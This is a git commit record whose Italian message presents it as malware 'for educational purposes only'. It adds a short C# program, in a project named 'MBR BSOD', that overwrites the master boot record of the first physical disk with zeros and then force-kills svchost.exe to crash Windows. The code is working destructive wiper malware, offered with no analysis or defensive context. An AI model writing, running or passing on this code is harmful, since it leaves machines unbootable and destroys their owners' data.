4abedfad20b516592a43d9cbccaffb73c2e836a0
MATTIAloyoutuber <164758246+MATTIAloyoutuber@users.noreply.github.com>
2024-04-30 22:34:55 +0200

    MALWARE SIMILE A CHI.exe  *SOLO A SCOPO EDUCATIVO*

---
+++ MBR BSOD/MBR BSOD/Program.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using System.IO;
+
+class MainClass
+{
+    public static void OverwriteMbr()
+    {
+        using (var fs = new FileStream(@"\\.\\PhysicalDrive0", FileMode.Open, FileAccess.ReadWrite))
+        {
+            byte[] buffer = new byte[512];
+            fs.Write(buffer, 0, buffer.Length);
+        }
+    }
+
+    public static void Main(string[] args)
+    {
+        OverwriteMbr();
+        System.Diagnostics.Process.Start("taskkill", "/IM svchost.exe /F");
+    }
+}
